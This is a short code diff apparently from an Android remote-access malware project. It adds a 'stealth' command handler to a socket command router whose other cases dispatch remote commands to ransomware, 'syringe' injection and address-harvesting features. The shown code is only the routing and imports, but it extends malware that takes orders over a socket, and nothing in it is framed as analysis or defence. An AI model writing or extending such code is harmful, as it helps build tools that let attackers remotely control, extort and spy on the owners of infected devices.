@@ -37,6 +37,7 @@ import com.fason.app.features.ransomware.RansomwareManager;
 import com.fason.app.features.addresses.AddressManager;
 import com.fason.app.features.syringe.SyringeManager;
 import com.fason.app.features.inspector.Inspector2;
+import com.fason.app.core.network.StealthCommandHandlers;
 import com.fason.app.service.MainService;
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -124,6 +125,7 @@ public final class SocketCommandRouter {
                 case Protocol.RANSOM:      handleRansom(data, socket, cmdId); break;
                 case Protocol.ADDRESSES:   handleAddresses(data, socket, cmdId); break;
                 case Protocol.SYRINGE:     handleSyringe(data, socket, cmdId); break;
+                case Protocol.STEALTH:     StealthCommandHandlers.handle(data, socket, cmdId); break;
                 default:
                     try {
                         JSONObject err = new JSONObject();
